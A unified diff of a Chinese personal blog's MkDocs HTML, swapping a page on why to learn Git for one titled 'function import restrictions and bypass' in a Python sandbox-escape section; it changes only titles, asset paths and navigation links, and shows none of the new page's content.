@@ -9,24 +9,24 @@
       
       
       
-        <link rel="prev" href="../07_%E4%BD%BF%E7%94%A8Git%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E8%B5%84%E6%BA%90/">
+        <link rel="prev" href="../01_%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0/">
       
       
-        <link rel="next" href="../Gitignore/">
+        <link rel="next" href="../../%E5%A4%8D%E4%B9%A0/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%94%A8%E4%BE%8B/">
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.0.13">
     
     
       
-        <title>08 为什么强烈建议学会使用Git - 韩林奇的个人博客</title>
+        <title>02 函数导入限制和绕过 - 韩林奇的个人博客</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.ffa9267a.min.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.ffa9267a.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.a0c5b2b5.min.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.a0c5b2b5.min.css">
       
       
 
@@ -42,7 +42,7 @@
       
     
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -71,7 +71,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#git" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -85,7 +85,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="../../.." title="韩林奇的个人博客" class="md-header__button md-logo" aria-label="韩林奇的个人博客" data-md-component="logo">
+    <a href="../../../.." title="韩林奇的个人博客" class="md-header__button md-logo" aria-label="韩林奇的个人博客" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
@@ -104,7 +104,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              08 为什么强烈建议学会使用Git
+              02 函数导入限制和绕过
             
           </span>
         </div>
@@ -211,7 +211,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="韩林奇的个人博客" class="md-nav__button md-logo" aria-label="韩林奇的个人博客" data-md-component="logo">
+    <a href="../../../.." title="韩林奇的个人博客" class="md-nav__button md-logo" aria-label="韩林奇的个人博客" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
@@ -242,7 +242,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href="../../../.." class="md-nav__link">
         Home
       </a>
     </li>
@@ -313,7 +313,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Docker/01_Docker%E5%9F%BA%E7%A1%80/01_Docker%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+      <a href="../../../../Docker/01_Docker%E5%9F%BA%E7%A1%80/01_Docker%E7%AE%80%E4%BB%8B/" class="md-nav__link">
         01 Docker简介
       </a>
     </li>
@@ -327,7 +327,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Docker/01_Docker%E5%9F%BA%E7%A1%80/02_Docker%E5%AE%89%E8%A3%85/" class="md-nav__link">
+      <a href="../../../../Docker/01_Docker%E5%9F%BA%E7%A1%80/02_Docker%E5%AE%89%E8%A3%85/" class="md-nav__link">
         02 Docker安装
       </a>
     </li>
@@ -341,7 +341,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Docker/01_Docker%E5%9F%BA%E7%A1%80/03_Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="md-nav__link">
+      <a href="../../../../Docker/01_Docker%E5%9F%BA%E7%A1%80/03_Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="md-nav__link">
         03 Docker常用命令
       </a>
     </li>
@@ -426,7 +426,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/01_Kubernetes%E4%BB%8B%E7%BB%8D/" class="md-nav__link">
+      <a href="../../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/01_Kubernetes%E4%BB%8B%E7%BB%8D/" class="md-nav__link">
         01 Kubernetes介绍
       </a>
     </li>
@@ -440,7 +440,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/02_Kubernetes%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="md-nav__link">
+      <a href="../../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/02_Kubernetes%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="md-nav__link">
         02 Kubernetes集群环境搭建
       </a>
     </li>
@@ -454,7 +454,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/03_Kubernetes%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86/" class="md-nav__link">
+      <a href="../../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/03_Kubernetes%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86/" class="md-nav__link">
         03 Kubernetes资源管理
       </a>
     </li>
@@ -468,7 +468,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/04_Kubernetes%E5%AE%9E%E6%88%98%E5%85%A5%E9%97%A8/" class="md-nav__link">
+      <a href="../../../../Kubernetes/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/04_Kubernetes%E5%AE%9E%E6%88%98%E5%85%A5%E9%97%A8/" class="md-nav__link">
         04 Kubernetes实战入门
       </a>
     </li>
@@ -526,7 +526,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../openai/openai_python_api/" class="md-nav__link">
+      <a href="../../../../openai/openai_python_api/" class="md-nav__link">
         Openai python api
       </a>
     </li>
@@ -577,7 +577,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E5%88%B6%E5%93%81%E7%AE%A1%E7%90%86/%E5%B8%B8%E7%94%A8%E9%95%9C%E5%83%8F/" class="md-nav__link">
+      <a href="../../../../%E5%88%B6%E5%93%81%E7%AE%A1%E7%90%86/%E5%B8%B8%E7%94%A8%E9%95%9C%E5%83%8F/" class="md-nav__link">
         常用镜像
       </a>
     </li>
@@ -618,7 +618,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E5%88%B6%E5%93%81%E7%AE%A1%E7%90%86/Harbor/Get%20Start/" class="md-nav__link">
+      <a href="../../../../%E5%88%B6%E5%93%81%E7%AE%A1%E7%90%86/Harbor/Get%20Start/" class="md-nav__link">
         Get Start
       </a>
     </li>
@@ -632,7 +632,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E5%88%B6%E5%93%81%E7%AE%A1%E7%90%86/Harbor/Harbor%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+      <a href="../../../../%E5%88%B6%E5%93%81%E7%AE%A1%E7%90%86/Harbor/Harbor%E7%AE%80%E4%BB%8B/" class="md-nav__link">
         Harbor简介
       </a>
     </li>
@@ -717,7 +717,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%8E%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF/%E5%9B%BD%E4%BA%A7%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" class="md-nav__link">
+      <a href="../../../../%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%8E%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF/%E5%9B%BD%E4%BA%A7%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" class="md-nav__link">
         国产加密算法
       </a>
     </li>
@@ -744,18 +744,16 @@
 
   
   
-    
-  
   
     
       
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
       
       
       
@@ -764,7 +762,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_7">
           <span class="md-nav__icon md-icon"></span>
           开发工具
@@ -775,16 +773,14 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" checked>
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" >
       
       
       
@@ -793,7 +789,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="true">
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_7_1">
           <span class="md-nav__icon md-icon"></span>
           Git
@@ -806,7 +802,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../01_%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/01_%E7%AE%80%E4%BB%8B/" class="md-nav__link">
         01 简介
       </a>
     </li>
@@ -820,7 +816,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../02_Git%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/02_Git%E5%9F%BA%E7%A1%80/" class="md-nav__link">
         02 Git基础
       </a>
     </li>
@@ -834,7 +830,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../03_Git%E6%97%A5%E5%B8%B8%E6%93%8D%E4%BD%9C/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/03_Git%E6%97%A5%E5%B8%B8%E6%93%8D%E4%BD%9C/" class="md-nav__link">
         03 Git日常操作
       </a>
     </li>
@@ -848,7 +844,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04_%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/04_%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" class="md-nav__link">
         04 远程仓库的使用
       </a>
     </li>
@@ -862,7 +858,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../05_%E9%AB%98%E7%BA%A7Git%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/05_%E9%AB%98%E7%BA%A7Git%E6%8A%80%E5%B7%A7/" class="md-nav__link">
         05 高级Git技巧
       </a>
     </li>
@@ -876,7 +872,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../06_%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/06_%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" class="md-nav__link">
         06 最佳实践与常见问题
       </a>
     </li>
@@ -890,7 +886,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../07_%E4%BD%BF%E7%94%A8Git%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E8%B5%84%E6%BA%90/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/07_%E4%BD%BF%E7%94%A8Git%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E8%B5%84%E6%BA%90/" class="md-nav__link">
         07 使用Git的工具和资源
       </a>
     </li>
@@ -902,199 +898,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          08 为什么强烈建议学会使用Git
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/08_%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BC%BA%E7%83%88%E5%BB%BA%E8%AE%AE%E5%AD%A6%E4%BC%9A%E4%BD%BF%E7%94%A8Git/" class="md-nav__link">
         08 为什么强烈建议学会使用Git
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#git" class="md-nav__link">
-    为什么强烈建议使用 Git
-  </a>
-  
-    <nav class="md-nav" aria-label="为什么强烈建议使用 Git">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    分布式的自由
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    强大的分支模型
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    协作与社区
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    安全性与完整性
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    易于备份和恢复
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    经历考验的稳定性
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
-    生态系统和工具
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
-    结论
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#git_1" class="md-nav__link">
-    Git 对于个人和团队项目的价值
-  </a>
-  
-    <nav class="md-nav" aria-label="Git 对于个人和团队项目的价值">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
-    个人项目的增强
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_10" class="md-nav__link">
-    团队协作的促进
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_11" class="md-nav__link">
-    跨部门和跨地域的协作
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_12" class="md-nav__link">
-    结论
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_13" class="md-nav__link">
-    鼓励读者继续学习和实践
-  </a>
-  
-    <nav class="md-nav" aria-label="鼓励读者继续学习和实践">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_14" class="md-nav__link">
-    拥抱持续学习的心态
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_15" class="md-nav__link">
-    结合实践巩固知识
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_16" class="md-nav__link">
-    利用在线资源和工具
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_17" class="md-nav__link">
-    分享你的学习成果
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_18" class="md-nav__link">
-    结论
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1106,7 +914,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Gitignore/" class="md-nav__link">
+      <a href="../../../../%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git/Gitignore/" class="md-nav__link">
         Gitignore
       </a>
     </li>
@@ -1191,7 +999,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/MongoDB/python%E5%AE%9E%E7%8E%B0demo/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/MongoDB/python%E5%AE%9E%E7%8E%B0demo/" class="md-nav__link">
         Python实现demo
       </a>
     </li>
@@ -1205,7 +1013,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/MongoDB/%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/MongoDB/%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" class="md-nav__link">
         基本命令
       </a>
     </li>
@@ -1253,7 +1061,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/MySQL/Json%E5%AD%97%E6%AE%B5%E6%93%8D%E4%BD%9C/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/MySQL/Json%E5%AD%97%E6%AE%B5%E6%93%8D%E4%BD%9C/" class="md-nav__link">
         Json字段操作
       </a>
     </li>
@@ -1301,7 +1109,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/RESP%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/RESP%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
         RESP协议
       </a>
     </li>
@@ -1315,7 +1123,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/" class="md-nav__link">
         Redis不同数据结构使用场景
       </a>
     </li>
@@ -1329,7 +1137,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E5%88%86%E5%B8%83%E5%BC%8F/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E5%88%86%E5%B8%83%E5%BC%8F/" class="md-nav__link">
         Redis分布式
       </a>
     </li>
@@ -1343,7 +1151,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%80%9A%E4%BF%A1/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%80%9A%E4%BF%A1/" class="md-nav__link">
         Redis分布式消息通信
       </a>
     </li>
@@ -1357,7 +1165,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E6%8C%81%E4%B9%85%E5%8C%96/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E6%8C%81%E4%B9%85%E5%8C%96/" class="md-nav__link">
         Redis持久化
       </a>
     </li>
@@ -1371,7 +1179,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB/" class="md-nav__link">
         Redis数据迁移
       </a>
     </li>
@@ -1385,7 +1193,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/Redis%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" class="md-nav__link">
         Redis的数据结构
       </a>
     </li>
@@ -1399,7 +1207,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/%E8%AF%BB%E5%86%99%E5%86%85%E5%AD%98/" class="md-nav__link">
+      <a href="../../../../%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/Redis/%E8%AF%BB%E5%86%99%E5%86%85%E5%AD%98/" class="md-nav__link">
         读写内存
       </a>
     </li>
@@ -1426,16 +1234,18 @@
 
   
   
+    
+  
   
     
       
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" checked>
       
       
       
@@ -1444,7 +1254,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_9">
           <span class="md-nav__icon md-icon"></span>
           编码
@@ -1484,7 +1294,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Go/%E6%88%90%E9%95%BF%E8%B7%AF%E7%BA%BF/" class="md-nav__link">
+      <a href="../../../Go/%E6%88%90%E9%95%BF%E8%B7%AF%E7%BA%BF/" class="md-nav__link">
         成长路线
       </a>
     </li>
@@ -1525,7 +1335,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Go/%E9%9D%A2%E8%AF%95/%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/" class="md-nav__link">
+      <a href="../../../Go/%E9%9D%A2%E8%AF%95/%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/" class="md-nav__link">
         开发常见错误总结
       </a>
     </li>
@@ -1551,14 +1361,16 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2" checked>
       
       
       
@@ -1567,7 +1379,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_2_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_2_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_9_2">
           <span class="md-nav__icon md-icon"></span>
           Python
@@ -1580,7 +1392,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/GIL/" class="md-nav__link">
+      <a href="../../GIL/" class="md-nav__link">
         GIL
       </a>
     </li>
@@ -1594,7 +1406,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/Pydantic/" class="md-nav__link">
+      <a href="../../Pydantic/" class="md-nav__link">
         Pydantic
       </a>
     </li>
@@ -1635,7 +1447,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/NumPy/00_%E5%89%8D%E8%A8%80/" class="md-nav__link">
+      <a href="../../NumPy/00_%E5%89%8D%E8%A8%80/" class="md-nav__link">
         00 前言
       </a>
     </li>
@@ -1649,7 +1461,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/NumPy/01_Ndarray/" class="md-nav__link">
+      <a href="../../NumPy/01_Ndarray/" class="md-nav__link">
         01 Ndarray
       </a>
     </li>
@@ -1663,7 +1475,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/NumPy/02_NumPy%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/" class="md-nav__link">
+      <a href="../../NumPy/02_NumPy%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/" class="md-nav__link">
         02 NumPy数据类型
       </a>
     </li>
@@ -1677,7 +1489,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/NumPy/03_Numpy%E6%95%B0%E7%BB%84%E5%88%9B%E5%BB%BA/" class="md-nav__link">
+      <a href="../../NumPy/03_Numpy%E6%95%B0%E7%BB%84%E5%88%9B%E5%BB%BA/" class="md-nav__link">
         03 Numpy数组创建
       </a>
     </li>
@@ -1691,7 +1503,7 @@
   
   
     <li class="md-nav__item">
